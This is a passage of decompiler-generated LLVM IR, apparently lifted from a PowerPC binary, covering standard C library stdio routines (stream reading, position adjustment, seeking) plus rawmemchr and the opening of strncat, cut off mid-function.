dec_label_pc_100131c8:                            ; preds = %dec_label_pc_100131c4
  br label %dec_label_pc_100131d0

dec_label_pc_100131d0:                            ; preds = %dec_label_pc_100131c4, %dec_label_pc_100131c8
  %v1_100131d0 = add i32 %tmp, 4
  %v2_100131d0 = inttoptr i32 %v1_100131d0 to i32*
  %v3_100131d0 = load i32, i32* %v2_100131d0, align 4
  store i32 %v3_100131d0, i32* %r3.global-to-local, align 4
  store i32 268513752, i32* @lr, align 4
  %v1_100131d4 = call i32 @__libc_read(i32 %v3_100131d0)
  store i32 %v1_100131d4, i32* %r3.global-to-local, align 4
  %v2_100131d8 = icmp sgt i32 %v1_100131d4, 0
  br i1 %v2_100131d8, label %dec_label_pc_100131fc, label %dec_label_pc_100131e0

dec_label_pc_100131e0:                            ; preds = %dec_label_pc_100131d0
  %v3_100131d8 = icmp eq i32 %v1_100131d4, 0
  %v0_100131e0 = load i32, i32* @r31, align 4
  %v1_100131e0 = inttoptr i32 %v0_100131e0 to i16*
  %v2_100131e0 = load i16, i16* %v1_100131e0, align 2
  br i1 %v3_100131d8, label %dec_label_pc_100131e8, label %dec_label_pc_100131f0

dec_label_pc_100131e8:                            ; preds = %dec_label_pc_100131e0
  %v1_100131e8 = or i16 %v2_100131e0, 4
  br label %dec_label_pc_100131f8

dec_label_pc_100131f0:                            ; preds = %dec_label_pc_100131e0
  %v1_100131f0 = or i16 %v2_100131e0, 8
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100131f8

dec_label_pc_100131f8:                            ; preds = %dec_label_pc_100131e8, %dec_label_pc_100131f0
  %v1_100131e8.sink.off0 = phi i16 [ %v1_100131e8, %dec_label_pc_100131e8 ], [ %v1_100131f0, %dec_label_pc_100131f0 ]
  store i16 %v1_100131e8.sink.off0, i16* %v1_100131e0, align 2
  %v0_1001320c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100131fc

dec_label_pc_100131fc:                            ; preds = %entry, %dec_label_pc_100131d0, %dec_label_pc_100131f8
  %v0_1001320c = phi i32 [ 0, %entry ], [ %v1_100131d4, %dec_label_pc_100131d0 ], [ %v0_1001320c.pre, %dec_label_pc_100131f8 ]
  store i32 %v0_100131a8, i32* @r31, align 4
  ret i32 %v0_1001320c

; uselistorder directives
  uselistorder i16 %v2_100131e0, { 1, 0 }
  uselistorder i32 %v1_100131d4, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 3, 4, 5, 0 }
  uselistorder i32 (i32)* @__libc_read, { 1, 0 }
  uselistorder label %dec_label_pc_100131fc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100131f8, { 1, 0 }
  uselistorder label %dec_label_pc_100131d0, { 1, 0 }
}

define i32 @__stdio_adjust_position(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %arg2, i32* @r8, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  %v3_10013228 = load i16, i16* %arg1, align 2
  %v4_10013228 = zext i16 %v3_10013228 to i32
  %tmp9 = urem i16 %v3_10013228, 4
  %v3_1001322c = icmp eq i16 %tmp9, 0
  br i1 %v3_1001322c, label %dec_label_pc_10013278, label %dec_label_pc_10013234

dec_label_pc_10013234:                            ; preds = %entry
  %v1_1001322c = zext i16 %tmp9 to i32
  %v1_10013234 = add nsw i32 %v1_1001322c, -1
  store i32 %v1_10013234, i32* %r10.global-to-local, align 4
  %v4_10013234 = icmp eq i32 %v1_10013234, 0
  br i1 %v4_10013234, label %dec_label_pc_10013278, label %dec_label_pc_1001323c

dec_label_pc_1001323c:                            ; preds = %dec_label_pc_10013234
  %v1_1001323c = and i32 %v4_10013228, 2048
  %v3_1001323c = icmp eq i32 %v1_1001323c, 0
  br i1 %v3_1001323c, label %dec_label_pc_10013278, label %dec_label_pc_10013244

dec_label_pc_10013244:                            ; preds = %dec_label_pc_1001323c
  %v2_10013244 = icmp sgt i32 %v1_10013234, 1
  br i1 %v2_10013244, label %dec_label_pc_100132f0, label %dec_label_pc_1001324c

dec_label_pc_1001324c:                            ; preds = %dec_label_pc_10013244
  %v2_1001324c = add i32 %tmp, 40
  %v3_1001324c = inttoptr i32 %v2_1001324c to i32*
  %v4_1001324c = load i32, i32* %v3_1001324c, align 4
  %v3_10013250 = icmp eq i32 %v4_1001324c, 0
  br i1 %v3_10013250, label %dec_label_pc_10013258, label %dec_label_pc_100132f0

dec_label_pc_10013258:                            ; preds = %dec_label_pc_1001324c
  %v2_10013258 = add i32 %tmp, 44
  %v3_10013258 = inttoptr i32 %v2_10013258 to i32*
  %v4_10013258 = load i32, i32* %v3_10013258, align 4
  %v2_1001325c = add i32 %tmp, 3
  %v3_1001325c = inttoptr i32 %v2_1001325c to i8*
  %v4_1001325c = load i8, i8* %v3_1001325c, align 1
  %v5_1001325c = zext i8 %v4_1001325c to i32
  %v2_10013264 = sub nsw i32 %v1_10013234, %v5_1001325c
  %v1_10013268 = add nsw i32 %v2_10013264, -1
  store i32 %v1_10013268, i32* %r10.global-to-local, align 4
  %tmp7 = icmp slt i32 %v4_10013258, 1
  br i1 %tmp7, label %dec_label_pc_10013278, label %dec_label_pc_10013270

dec_label_pc_10013270:                            ; preds = %dec_label_pc_10013258
  %v2_10013270 = add i32 %tmp, 2
  %v3_10013270 = inttoptr i32 %v2_10013270 to i8*
  %v4_10013270 = load i8, i8* %v3_10013270, align 1
  %v5_10013270 = zext i8 %v4_10013270 to i32
  %v2_10013274 = sub nsw i32 %v1_10013268, %v5_10013270
  store i32 %v2_10013274, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10013278

dec_label_pc_10013278:                            ; preds = %dec_label_pc_10013258, %dec_label_pc_1001323c, %dec_label_pc_10013234, %entry, %dec_label_pc_10013270
  %v0_1001329c = phi i32 [ %v1_10013268, %dec_label_pc_10013258 ], [ %v1_10013234, %dec_label_pc_1001323c ], [ 0, %dec_label_pc_10013234 ], [ 0, %entry ], [ %v2_10013274, %dec_label_pc_10013270 ]
  %v1_10013278 = and i32 %v4_10013228, 64
  %v3_10013278 = icmp eq i32 %v1_10013278, 0
  %storemerge.in.in.v = select i1 %v3_10013278, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v2_1001328c = add i32 %tmp, 16
  %v3_1001328c = inttoptr i32 %v2_1001328c to i32*
  %v4_1001328c = load i32, i32* %v3_1001328c, align 4
  %v1_10013290 = inttoptr i32 %arg2 to i32*
  %v2_10013290 = load i32, i32* %v1_10013290, align 4
  store i32 %v2_10013290, i32* %r4.global-to-local, align 4
  %v2_10013294 = sub i32 %storemerge, %v4_1001328c
  %v1_10013298 = add i32 %arg2, 4
  %v2_10013298 = inttoptr i32 %v1_10013298 to i32*
  %v3_10013298 = load i32, i32* %v2_10013298, align 4
  store i32 %v3_10013298, i32* %r5.global-to-local, align 4
  %v2_1001329c = add i32 %v2_10013294, %v0_1001329c
  store i32 %v2_1001329c, i32* %r31.global-to-local, align 4
  %tmp10 = icmp slt i32 %v2_1001329c, 0
  %v1_100132a4 = zext i1 %tmp10 to i32
  %v2_100132a4 = ashr i32 %v2_1001329c, 31
  %v3_100132a4 = and i32 %v2_100132a4, -2
  %v4_100132a4 = or i32 %v3_100132a4, %v1_100132a4
  %v2_100132a8 = sub i32 %v3_10013298, %v2_1001329c
  %v3_100132a8 = sub i32 -1, %v2_1001329c
  store i32 %v2_100132a8, i32* %r10.global-to-local, align 4
  %v6_100132a8 = icmp ule i32 %v2_100132a8, %v3_100132a8
  %v2_100132ac = sub nsw i32 -1, %v4_100132a4
  %v3_100132ac = add i32 %v2_10013290, %v2_100132ac
  %v5_100132ac = zext i1 %v6_100132a8 to i32
  %v6_100132ac = add i32 %v3_100132ac, %v5_100132ac
  store i32 %v6_100132ac, i32* %v1_10013290, align 4
  %v0_100132b4 = load i32, i32* %r10.global-to-local, align 4
  %v1_100132b4 = load i32, i32* @r8, align 4
  %v2_100132b4 = add i32 %v1_100132b4, 4
  %v3_100132b4 = inttoptr i32 %v2_100132b4 to i32*
  store i32 %v0_100132b4, i32* %v3_100132b4, align 4
  %v0_100132b8 = load i32, i32* @r8, align 4
  %v1_100132b8 = inttoptr i32 %v0_100132b8 to i32*
  %v2_100132b8 = load i32, i32* %v1_100132b8, align 4
  %v1_100132bc = load i32, i32* %r4.global-to-local, align 4
  %v3_100132bc = icmp sgt i32 %v2_100132b8, %v1_100132bc
  br i1 %v3_100132bc, label %dec_label_pc_100132d4, label %dec_label_pc_100132c4

dec_label_pc_100132c4:                            ; preds = %dec_label_pc_10013278
  %v4_100132bc = icmp eq i32 %v2_100132b8, %v1_100132bc
  br i1 %v4_100132bc, label %dec_label_pc_100132c8, label %dec_label_pc_100132d8thread-pre-split

dec_label_pc_100132c8:                            ; preds = %dec_label_pc_100132c4
  %v1_100132c8 = add i32 %v0_100132b8, 4
  %v2_100132c8 = inttoptr i32 %v1_100132c8 to i32*
  %v3_100132c8 = load i32, i32* %v2_100132c8, align 4
  %v1_100132cc = load i32, i32* %r5.global-to-local, align 4
  %v3_100132cc = icmp ugt i32 %v3_100132c8, %v1_100132cc
  br i1 %v3_100132cc, label %dec_label_pc_100132d4, label %dec_label_pc_100132d8thread-pre-split

dec_label_pc_100132d4:                            ; preds = %dec_label_pc_100132c8, %dec_label_pc_10013278
  %v0_100132d4 = load i32, i32* %r31.global-to-local, align 4
  %v1_100132d4 = sub i32 0, %v0_100132d4
  store i32 %v1_100132d4, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100132d8

dec_label_pc_100132d8thread-pre-split:            ; preds = %dec_label_pc_100132c4, %dec_label_pc_100132c8
  %v0_100132d8.pr = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100132d8

dec_label_pc_100132d8:                            ; preds = %dec_label_pc_100132d8thread-pre-split, %dec_label_pc_100132d4
  %v0_100132d8 = phi i32 [ %v0_100132d8.pr, %dec_label_pc_100132d8thread-pre-split ], [ %v1_100132d4, %dec_label_pc_100132d4 ]
  %tmp8 = icmp sgt i32 %v0_100132d8, -1
  br i1 %tmp8, label %dec_label_pc_100132f4, label %dec_label_pc_100132e0

dec_label_pc_100132e0:                            ; preds = %dec_label_pc_100132d8
  %v0_100132e0 = call i32 @__errno_location()
  %v2_100132e8 = inttoptr i32 %v0_100132e0 to i32*
  store i32 75, i32* %v2_100132e8, align 4
  %v0_100132f8.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100132f4

dec_label_pc_100132f0:                            ; preds = %dec_label_pc_1001324c, %dec_label_pc_10013244
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100132f4

dec_label_pc_100132f4:                            ; preds = %dec_label_pc_100132d8, %dec_label_pc_100132e0, %dec_label_pc_100132f0
  %v0_100132f8 = phi i32 [ %v0_100132d8, %dec_label_pc_100132d8 ], [ %v0_100132f8.pre, %dec_label_pc_100132e0 ], [ -1, %dec_label_pc_100132f0 ]
  ret i32 %v0_100132f8

; uselistorder directives
  uselistorder i32 %v2_100132b8, { 1, 0 }
  uselistorder i32 %v2_1001329c, { 0, 2, 3, 1, 4 }
  uselistorder i16 %tmp9, { 1, 0 }
  uselistorder i32 %tmp, { 5, 0, 1, 3, 2, 4 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r31.global-to-local, { 0, 4, 3, 1, 2, 5 }
  uselistorder i32 2048, { 1, 2, 3, 4, 0, 5 }
  uselistorder i16 4, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_100132f4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100132d8thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_10013278, { 4, 0, 1, 2, 3 }
}

define i32 @__stdio_rfill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %v0_1001330c = load i32, i32* @lr, align 4
  store i32 %v0_1001330c, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r29, align 4
  %v1_10013320 = add i32 %arg1, 8
  %v2_10013320 = inttoptr i32 %v1_10013320 to i32*
  %v3_10013320 = load i32, i32* %v2_10013320, align 4
  %v1_10013324 = add i32 %arg1, 12
  %v2_10013324 = inttoptr i32 %v1_10013324 to i32*
  %v3_10013324 = load i32, i32* %v2_10013324, align 4
  %v2_10013328 = sub i32 %v3_10013324, %v3_10013320
  store i32 268514096, i32* @lr, align 4
  %v3_1001332c = inttoptr i32 %v3_10013320 to i16*
  %v4_1001332c = call i32 @__stdio_READ(i16* %v3_1001332c, i32 %v2_10013328, i32 %v2_10013328)
  %v0_10013330 = load i32, i32* @r29, align 4
  %v1_10013330 = add i32 %v0_10013330, 8
  %v2_10013330 = inttoptr i32 %v1_10013330 to i32*
  %v3_10013330 = load i32, i32* %v2_10013330, align 4
  %v2_10013334 = add i32 %v3_10013330, %v4_1001332c
  store i32 %v2_10013334, i32* %r0.global-to-local, align 4
  %v2_10013338 = add i32 %v0_10013330, 16
  %v3_10013338 = inttoptr i32 %v2_10013338 to i32*
  store i32 %v3_10013330, i32* %v3_10013338, align 4
  %v0_1001333c = load i32, i32* %r0.global-to-local, align 4
  %v1_1001333c = load i32, i32* @r29, align 4
  %v2_1001333c = add i32 %v1_1001333c, 20
  %v3_1001333c = inttoptr i32 %v2_1001333c to i32*
  store i32 %v0_1001333c, i32* %v3_1001333c, align 4
  store i32 %v0_1001330c, i32* %r0.global-to-local, align 4
  ret i32 %v4_1001332c

; uselistorder directives
  uselistorder i32 %v3_10013330, { 1, 0 }
  uselistorder i32 %v4_1001332c, { 1, 0 }
  uselistorder i32 %v3_10013320, { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @__stdio_trans2r_o(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v0_1001335c = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_10013368 = load i16, i16* %arg1, align 2
  %v4_10013368 = zext i16 %v3_10013368 to i32
  %v2_1001336c = and i32 %v4_10013368, %arg2
  %v5_1001336c = icmp eq i32 %v2_1001336c, 0
  br i1 %v5_1001336c, label %dec_label_pc_10013374, label %dec_label_pc_10013384

dec_label_pc_10013374:                            ; preds = %entry
  %v1_10013374 = and i32 %v4_10013368, 2176
  %v3_10013374 = icmp eq i32 %v1_10013374, 0
  br i1 %v3_10013374, label %dec_label_pc_1001337c, label %dec_label_pc_10013390

dec_label_pc_1001337c:                            ; preds = %dec_label_pc_10013374
  %v2_1001337c = or i32 %v4_10013368, %arg2
  %v1_10013380 = trunc i32 %v2_1001337c to i16
  store i16 %v1_10013380, i16* %arg1, align 2
  %v0_10013384.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10013384

dec_label_pc_10013384:                            ; preds = %entry, %dec_label_pc_1001337c
  %v0_10013384 = phi i32 [ %tmp, %entry ], [ %v0_10013384.pre, %dec_label_pc_1001337c ]
  %v1_10013384 = inttoptr i32 %v0_10013384 to i16*
  %v2_10013384 = load i16, i16* %v1_10013384, align 2
  %v3_10013384 = zext i16 %v2_10013384 to i32
  %v1_10013388 = and i32 %v3_10013384, 16
  %v3_10013388 = icmp eq i32 %v1_10013388, 0
  br i1 %v3_10013388, label %dec_label_pc_100133ac, label %dec_label_pc_10013390

dec_label_pc_10013390:                            ; preds = %dec_label_pc_10013374, %dec_label_pc_10013384
  %v0_10013390 = call i32 @__errno_location()
  store i32 %v0_10013390, i32* %r3.global-to-local, align 4
  %v2_10013398 = inttoptr i32 %v0_10013390 to i32*
  store i32 9, i32* %v2_10013398, align 4
  br label %dec_label_pc_1001339c

dec_label_pc_1001339c:                            ; preds = %dec_label_pc_100133b4, %dec_label_pc_10013390
  %v0_1001339c = load i32, i32* @r31, align 4
  %v1_1001339c = inttoptr i32 %v0_1001339c to i16*
  %v2_1001339c = load i16, i16* %v1_1001339c, align 2
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_100133a4 = or i16 %v2_1001339c, 8
  br label %dec_label_pc_100133e0

dec_label_pc_100133ac:                            ; preds = %dec_label_pc_10013384
  %v1_100133ac = and i32 %v3_10013384, 64
  %v3_100133ac = icmp eq i32 %v1_100133ac, 0
  br i1 %v3_100133ac, label %dec_label_pc_100133d4, label %dec_label_pc_100133b4

dec_label_pc_100133b4:                            ; preds = %dec_label_pc_100133ac
  store i32 268514232, i32* @lr, align 4
  %v0_100133b4 = call i32 @__stdio_wcommit()
  store i32 %v0_100133b4, i32* %r3.global-to-local, align 4
  %v3_100133b8 = icmp eq i32 %v0_100133b4, 0
  br i1 %v3_100133b8, label %dec_label_pc_100133c0, label %dec_label_pc_1001339c

dec_label_pc_100133c0:                            ; preds = %dec_label_pc_100133b4
  %v0_100133c0 = load i32, i32* @r31, align 4
  %v1_100133c0 = inttoptr i32 %v0_100133c0 to i16*
  %v2_100133c0 = load i16, i16* %v1_100133c0, align 2
  %v3_100133c0 = zext i16 %v2_100133c0 to i32
  %v1_100133c4 = add i32 %v0_100133c0, 8
  %v2_100133c4 = inttoptr i32 %v1_100133c4 to i32*
  %v3_100133c4 = load i32, i32* %v2_100133c4, align 4
  %v1_100133c8 = call i32 @__asm_rlwinm(i32 %v3_100133c0, i32 0, i32 26, i32 24)
  %v2_100133c8 = trunc i32 %v1_100133c8 to i16
  %v1_100133cc = load i32, i32* @r31, align 4
  %v2_100133cc = add i32 %v1_100133cc, 28
  %v3_100133cc = inttoptr i32 %v2_100133cc to i32*
  store i32 %v3_100133c4, i32* %v3_100133cc, align 4
  %v3_100133d0 = load i32, i32* @r31, align 4
  %v4_100133d0 = inttoptr i32 %v3_100133d0 to i16*
  store i16 %v2_100133c8, i16* %v4_100133d0, align 2
  %v0_100133d4.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100133d4

dec_label_pc_100133d4:                            ; preds = %dec_label_pc_100133ac, %dec_label_pc_100133c0
  %v0_100133d4 = phi i32 [ %v0_10013384, %dec_label_pc_100133ac ], [ %v0_100133d4.pre, %dec_label_pc_100133c0 ]
  %v1_100133d4 = inttoptr i32 %v0_100133d4 to i16*
  %v2_100133d4 = load i16, i16* %v1_100133d4, align 2
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_100133dc = or i16 %v2_100133d4, 1
  br label %dec_label_pc_100133e0

dec_label_pc_100133e0:                            ; preds = %dec_label_pc_1001339c, %dec_label_pc_100133d4
  %v2_100133e0 = phi i32 [ %v0_1001339c, %dec_label_pc_1001339c ], [ %v0_100133d4, %dec_label_pc_100133d4 ]
  %storemerge.off0 = phi i16 [ %v1_100133a4, %dec_label_pc_1001339c ], [ %v1_100133dc, %dec_label_pc_100133d4 ]
  %v3_100133e0 = inttoptr i32 %v2_100133e0 to i16*
  store i16 %storemerge.off0, i16* %v3_100133e0, align 2
  store i32 %v0_1001335c, i32* @r31, align 4
  %v0_100133f4 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_100133f4

; uselistorder directives
  uselistorder i32 %v4_10013368, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3, 4 }
  uselistorder i32 26, { 4, 2, 5, 6, 3, 8, 9, 1, 7, 0 }
  uselistorder i32 ()* @__stdio_wcommit, { 3, 6, 5, 4, 2, 1, 0 }
  uselistorder i32 64, { 6, 3, 4, 5, 2, 8, 9, 11, 7, 12, 0, 1, 10 }
  uselistorder i16 8, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 2176, { 1, 0 }
  uselistorder i16* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100133e0, { 1, 0 }
  uselistorder label %dec_label_pc_100133d4, { 1, 0 }
  uselistorder label %dec_label_pc_10013390, { 1, 0 }
  uselistorder label %dec_label_pc_10013384, { 1, 0 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %v0_100133f8 = load i32, i32* @lr, align 4
  store i32 %v0_100133f8, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* @r7, align 4
  %v0_10013404 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v1_10013410 = add i32 %arg1, 4
  %v2_10013410 = inttoptr i32 %v1_10013410 to i32*
  %v3_10013410 = load i32, i32* %v2_10013410, align 4
  %v2_10013414 = load i32, i32* %arg2, align 4
  %v1_10013418 = add i32 %tmp, 4
  %v2_10013418 = inttoptr i32 %v1_10013418 to i32*
  %v3_10013418 = load i32, i32* %v2_10013418, align 4
  store i32 268514336, i32* @lr, align 4
  %v4_1001341c = call i32 @__libc_lseek64(i32 %v3_10013410, i32 %v2_10013414, i32 %v3_10013418, i32 %arg3)
  %v1_10013420 = icmp slt i32 %v4_1001341c, 0
  store i32 %tmp, i32* %r0.global-to-local, align 4
  br i1 %v1_10013420, label %dec_label_pc_10013438, label %dec_label_pc_1001342c

dec_label_pc_1001342c:                            ; preds = %entry
  %v1_1001342c = load i32, i32* @r31, align 4
  %v2_1001342c = inttoptr i32 %v1_1001342c to i32*
  store i32 %v4_1001341c, i32* %v2_1001342c, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10013434 = load i32, i32* @r31, align 4
  %v2_10013434 = add i32 %v1_10013434, 4
  %v3_10013434 = inttoptr i32 %v2_10013434 to i32*
  store i32 %tmp, i32* %v3_10013434, align 4
  %v0_10013438.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10013438

dec_label_pc_10013438:                            ; preds = %entry, %dec_label_pc_1001342c
  %v0_10013438 = phi i32 [ %tmp, %entry ], [ %v0_10013438.pre, %dec_label_pc_1001342c ]
  store i32 %v0_100133f8, i32* %r0.global-to-local, align 4
  store i32 %v0_10013404, i32* @r31, align 4
  ret i32 %v0_10013438

; uselistorder directives
  uselistorder i32 %tmp, { 0, 1, 3, 4, 2 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_10013438, { 1, 0 }
}

define i32 @rawmemchr(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v1_10013450 = urem i32 %arg1, 256
  store i32 %v1_10013450, i32* %r4.global-to-local, align 4
  %v0_100134681 = load i32, i32* @r3, align 4
  %v1_100134682 = urem i32 %v0_100134681, 4
  %v3_100134684 = icmp eq i32 %v1_100134682, 0
  br i1 %v3_100134684, label %dec_label_pc_10013470, label %dec_label_pc_10013458

dec_label_pc_10013458:                            ; preds = %entry, %dec_label_pc_10013458
  %v1_1001345c = phi i32 [ %v0_10013470.pre, %dec_label_pc_10013458 ], [ %v1_10013450, %entry ]
  %v0_10013458 = phi i32 [ %v1_10013464, %dec_label_pc_10013458 ], [ %v0_100134681, %entry ]
  %v1_10013458 = inttoptr i32 %v0_10013458 to i8*
  %v2_10013458 = load i8, i8* %v1_10013458, align 1
  %v3_10013458 = zext i8 %v2_10013458 to i32
  %v4_1001345c = icmp eq i32 %v3_10013458, %v1_1001345c
  %v0_10013460 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1001345c, i32 %v0_10013460)
  %v0_10013464 = load i32, i32* @r3, align 4
  %v1_10013464 = add i32 %v0_10013464, 1
  store i32 %v1_10013464, i32* @r3, align 4
  %v1_10013468 = urem i32 %v1_10013464, 4
  %v3_10013468 = icmp eq i32 %v1_10013468, 0
  %v0_10013470.pre = load i32, i32* %r4.global-to-local, align 4
  br i1 %v3_10013468, label %dec_label_pc_10013470, label %dec_label_pc_10013458

dec_label_pc_10013470:                            ; preds = %dec_label_pc_10013458, %entry
  %v0_100134889 = phi i32 [ %v0_100134681, %entry ], [ %v1_10013464, %dec_label_pc_10013458 ]
  %v0_10013470 = phi i32 [ %v1_10013450, %entry ], [ %v0_10013470.pre, %dec_label_pc_10013458 ]
  %v1_10013470 = mul i32 %v0_10013470, 256
  %v2_10013478 = or i32 %v1_10013470, %v0_10013470
  %v1_10013480 = mul i32 %v2_10013478, 65536
  %v2_10013484 = or i32 %v1_10013480, %v2_10013478
  br label %dec_label_pc_10013488

dec_label_pc_10013488:                            ; preds = %dec_label_pc_100134f4, %dec_label_pc_10013488, %dec_label_pc_10013470
  %v0_100134c4 = phi i32 [ %v0_100134889, %dec_label_pc_10013470 ], [ %v1_1001348c, %dec_label_pc_10013488 ], [ %v1_1001348c, %dec_label_pc_100134f4 ]
  %v1_10013488 = inttoptr i32 %v0_100134c4 to i32*
  %v2_10013488 = load i32, i32* %v1_10013488, align 4
  %v1_1001348c = add i32 %v0_100134c4, 4
  %v1_10013490 = add i32 %v0_100134c4, 2
  %v2_10013494 = xor i32 %v2_10013488, %v2_10013484
  %v1_1001349c = add i32 %v2_10013494, 2130640639
  %v2_100134a0 = xor i32 %v1_1001349c, %v2_10013494
  %v1_100134a4 = add i32 %v0_100134c4, 1
  %v2_100134a8 = and i32 %v2_100134a0, -2130640640
  %v6_100134a8 = icmp eq i32 %v2_100134a8, -2130640640
  br i1 %v6_100134a8, label %dec_label_pc_10013488, label %dec_label_pc_100134b4

dec_label_pc_100134b4:                            ; preds = %dec_label_pc_10013488
  %v2_100134b4 = inttoptr i32 %v0_100134c4 to i8*
  %v3_100134b4 = load i8, i8* %v2_100134b4, align 1
  %v4_100134b4 = zext i8 %v3_100134b4 to i32
  %v1_100134b8 = add i32 %v0_100134c4, 3
  %v4_100134bc = icmp eq i32 %v4_100134b4, %v0_10013470
  br i1 %v4_100134bc, label %dec_label_pc_100134c4, label %dec_label_pc_100134cc

dec_label_pc_100134c4:                            ; preds = %dec_label_pc_100134b4
  ret i32 %v0_100134c4

dec_label_pc_100134cc:                            ; preds = %dec_label_pc_100134b4
  %v2_100134cc = inttoptr i32 %v1_100134a4 to i8*
  %v3_100134cc = load i8, i8* %v2_100134cc, align 1
  %v4_100134cc = zext i8 %v3_100134cc to i32
  %v4_100134d0 = icmp eq i32 %v4_100134cc, %v0_10013470
  br i1 %v4_100134d0, label %dec_label_pc_100134d8, label %dec_label_pc_100134e0

dec_label_pc_100134d8:                            ; preds = %dec_label_pc_100134cc
  ret i32 %v1_100134a4

dec_label_pc_100134e0:                            ; preds = %dec_label_pc_100134cc
  %v2_100134e0 = inttoptr i32 %v1_10013490 to i8*
  %v3_100134e0 = load i8, i8* %v2_100134e0, align 1
  %v4_100134e0 = zext i8 %v3_100134e0 to i32
  %v4_100134e4 = icmp eq i32 %v4_100134e0, %v0_10013470
  br i1 %v4_100134e4, label %dec_label_pc_100134ec, label %dec_label_pc_100134f4

dec_label_pc_100134ec:                            ; preds = %dec_label_pc_100134e0
  ret i32 %v1_10013490

dec_label_pc_100134f4:                            ; preds = %dec_label_pc_100134e0
  %v2_100134f4 = inttoptr i32 %v1_100134b8 to i8*
  %v3_100134f4 = load i8, i8* %v2_100134f4, align 1
  %v4_100134f4 = zext i8 %v3_100134f4 to i32
  %v4_100134f8 = icmp eq i32 %v4_100134f4, %v0_10013470
  br i1 %v4_100134f8, label %dec_label_pc_10013500, label %dec_label_pc_10013488

dec_label_pc_10013500:                            ; preds = %dec_label_pc_100134f4
  ret i32 %v1_100134b8

; uselistorder directives
  uselistorder i32 %v1_1001348c, { 1, 0 }
  uselistorder i32 %v0_100134c4, { 0, 1, 3, 2, 6, 5, 4 }
  uselistorder i32 %v2_10013478, { 1, 0 }
  uselistorder i32 %v0_10013470, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_10013464, { 1, 0, 3, 2 }
  uselistorder i32 %v0_100134681, { 2, 1, 0 }
  uselistorder i32 %v1_10013450, { 1, 2, 0 }
  uselistorder i32 -2130640640, { 0, 3, 2, 9, 1, 4, 10, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_10013458, { 1, 0 }
}

define i32 @__GI_strncat(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1001350c

dec_label_pc_1001350c:                            ; preds = %dec_label_pc_1001350c, %entry
  %v0_1001350c = phi i32 [ %v1_10013510, %dec_label_pc_1001350c ], [ %tmp, %entry ]
  %v1_1001350c = inttoptr i32 %v0_1001350c to i8*
  %v2_1001350c = load i8, i8* %v1_1001350c, align 1
  %v1_10013510 = add i32 %v0_1001350c, 1
  store i32 %v1_10013510, i32* %r11.global-to-local, align 4
  %v3_10013514 = icmp eq i8 %v2_1001350c, 0
  store i1 %v3_10013514, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10013514, label %dec_label_pc_1001351c, label %dec_label_pc_1001350c

dec_label_pc_1001351c:                            ; preds = %dec_label_pc_1001350c
  %v3_1001351c = icmp eq i32 %arg2, 3
